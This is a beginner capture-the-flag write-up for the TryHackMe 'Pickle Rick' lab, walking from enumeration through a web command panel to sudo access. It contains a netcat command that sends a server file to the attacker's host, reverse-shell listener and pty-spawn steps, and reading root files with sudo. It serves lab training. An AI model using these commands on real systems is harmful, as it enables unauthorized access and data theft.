
---
title:Pickle Rick
categories: [Web, Easy ]
tags: [web, easy, nmap, dirsearch, netcat]
image: images/Pickle Rick/Pickle Rick.png
---

# Pickle Rick - TryHackMe Writeup

This guide walks through solving the *Pickle Rick* TryHackMe challenge, a beginner-friendly CTF focused on web enumeration and shell techniques. Since TryHackMe machines use dynamic IPs, replace `<targetIP>` with the target machine's IP and `<yourIP>` with your attacking machine's IP.

## Step 1: Initial Reconnaissance with Nmap
Scan the target to identify open ports and services:  
```
nmap -Pn -sC -sV --min-rate=10000 <targetIP>
```

**Output**:  
- **Port 22 (SSH)**: Open, indicating potential SSH access.  
- **Port 80 (HTTP)**: Open, hosting a web server.

Visiting `http://<targetIP>` reveals a webpage with a challenge to find three "ingredients" (flags).

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_3.png)

## Step 2: Web Enumeration
Check the webpage's source code for clues, revealing a username: `R1ckRul3s`.  

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_4.png)

Run a directory scan using *dirsearch*:  
```
dirsearch -u http://<targetIP>
```

**Findings**:  
- `/robots.txt`: Contains `Wubbalubbadubdub`.  
- `/login.php`: A login page.

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_5.png)

## Step 3: Gaining Access
Log in using:  
- **Username**: `R1ckRul3s`  
- **Password**: `Wubbalubbadubdub`

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_6.png)

Upon login, a **Command Panel** allows command execution on the server.

## Step 4: Finding the First Ingredient
In the Command Panel, list files in `/var/www/html`. A file `Sup3rS3cretPickl3Ingred.txt` is present. Since `cat` is disabled, access it via the browser:  
```
http://<targetIP>/Sup3rS3cretPickl3Ingred.txt
```

This yields the **first ingredient**.

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_7.png)

## Step 5: Finding the Second Ingredient
Enumerate `/home/rick` via the Command Panel, finding `second ingredients`. Set up a *netcat* listener on your machine:  
```
nc -vnlp 9003 > file.txt
```

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_8.png)

In the Command Panel, send the file:  
```
/bin/sh | nc <yourIP> 9003 < /home/rick/'second ingredients'
```

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_9.png)

Read `file.txt` to obtain the **second ingredient**.

## Step 6: Escalating Privileges and Finding the Third Ingredient
Check *sudo* privileges in the Command Panel:  
```
sudo -l
```

**Output**: The user can run any command with *sudo* without a password.

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_10.png)

Set up a *netcat* listener on your machine:  
```
nc -vnlp 9003
```

![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_11.png)

Once connected, spawn an interactive shell:  
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
or
bash -i
```

## Step 7: Locating the Third Ingredient

Alternatively, use *sudo* to read the file in `/root`:  
```
sudo cat /root/3rd.txt
```

## Summary
- **First Ingredient**: Found in `Sup3rS3cretPickl3Ingred.txt` via the browser.  
- **Second Ingredient**: Transferred from `/home/rick/'second ingredients'` using *netcat*.  
- **Third Ingredient**: Retrieved from  `/root/3rd.txt` via a reverse shell with *sudo* privileges.

This streamlined approach uses basic enumeration, web exploitation, and reverse shell techniques to efficiently complete the challenge.